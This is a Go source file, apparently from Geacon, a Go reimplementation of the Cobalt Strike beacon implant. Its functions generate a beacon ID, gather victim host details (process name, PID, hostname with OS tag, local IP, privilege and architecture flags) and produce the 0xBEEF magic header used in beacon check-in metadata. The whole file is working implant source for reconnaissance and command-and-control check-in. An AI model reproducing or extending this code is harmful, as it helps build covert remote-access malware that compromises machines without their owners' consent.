package sysinfo

import (
	"encoding/binary"
	"main/config"
	"main/util"
	"net"
	"os"
	"runtime"
	"strings"
)

const (
	ProcessArch86      = 0
	ProcessArch64      = 1
	ProcessArchIA64    = 2
	ProcessArchUnknown = 3
)

func GeaconID() int {
	randomInt := util.RandomInt(100000, 999998)
	if randomInt%2 == 0 {
		return randomInt
	} else {
		return randomInt + 1
	}
}

func GetProcessName() string {
	processName := os.Args[0]
	if len(processName) > 10 {
		processName = processName[len(processName)-9:]
	}
	return strings.ReplaceAll(strings.ReplaceAll(processName, "./", ""), "/", "")
}

func GetPID() int {
	return os.Getpid()
}

func GetComputerName() string {
	sHostName, _ := os.Hostname()
	// message too long for RSA public key size

	if runtime.GOOS == "linux" {
		sHostName = sHostName + " (Linux)"
	} else if runtime.GOOS == "darwin" {
		sHostName = sHostName + " (Darwin)"
	}
	if len(sHostName) > config.ComputerNameLength {
		return sHostName[:config.ComputerNameLength]
	}
	return sHostName
}

func GetMetaDataFlag() byte {
	flagInt := byte(0)
	if IsHighPriv() {
		flagInt += 8
	}
	if IsOSX64() {
		flagInt += 4
	}
	if IsProcessX64() {
		flagInt += 2
	} else {
		flagInt += 1
	}
	return flagInt
}

func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && !strings.HasPrefix(ipnet.IP.String(), "169.254") && ipnet.IP.To4() != nil {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

func GetMagicHead() []byte {
	MagicNum := 0xBEEF
	MagicNumBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(MagicNumBytes, uint32(MagicNum))
	return MagicNumBytes
}
